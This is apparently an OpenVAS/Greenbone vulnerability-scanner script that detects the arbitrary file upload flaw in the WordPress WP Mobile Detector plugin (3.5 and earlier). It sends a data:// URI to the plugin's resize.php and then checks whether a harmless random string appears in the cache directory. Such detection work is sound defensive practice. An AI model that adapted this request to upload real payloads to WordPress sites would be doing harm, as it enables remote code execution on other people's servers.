CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.107012" );
	script_tag( name: "cvss_base", value: "4.6" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:S/C:P/I:P/A:P" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2016-06-14 10:42:39 +0100 (Tue, 14 Jun 2016)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "WordPress WP Mobile Detector Plugin 3.5 - Arbitrary File Upload Vulnerability" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/39891/" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_tag( name: "summary", value: "Remotely upload arbitrary files on WordPress webserver when WP
  Mobile Detector Plugin is installed and enabled." );
	script_tag( name: "insight", value: "An installed and enabled WP Mobile Detector plugin in WordPress
  blogs enable hackers to remotely upload files to WordPress webserver." );
	script_tag( name: "impact", value: "Successful exploitation allows an attacker to load up whatever file
  he wants to the WordPress server. This can result in arbitrary code execution within the context of the vulnerable application." );
	script_tag( name: "affected", value: "WordPress WP Mobile detector plugin up to and including version 3.5" );
	script_tag( name: "solution", value: "Update WP Mobile Detector Plugin to version 3.7." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
require("url_func.inc.sc");
if(!wpPort = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: wpPort )){
	exit( 0 );
}
vtstrings = get_vt_strings();
str = vtstrings["default_rand"];
data = base64( str: str );
ex = "data://text/plain;base64," + data;
ex_url = dir + "wp-content/plugins/wp-mobile-detector/resize.php?src=" + urlencode( str: ex );
check_url = dir + "wp-content/plugins/wp-mobile-detector/cache/" + urlencode( str: "plain;base64," + data );
req = http_get( item: ex_url, port: wpPort );
buf = http_keepalive_send_recv( port: wpPort, data: req, bodyonly: FALSE );
if(IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" ) && ContainsString( buf, "GIF89" )){
	if(http_vuln_check( port: wpPort, url: check_url, pattern: str, check_header: TRUE )){
		report = http_report_vuln_url( port: wpPort, url: ex_url );
		security_message( port: wpPort, data: report );
		exit( 0 );
	}
}
exit( 99 );

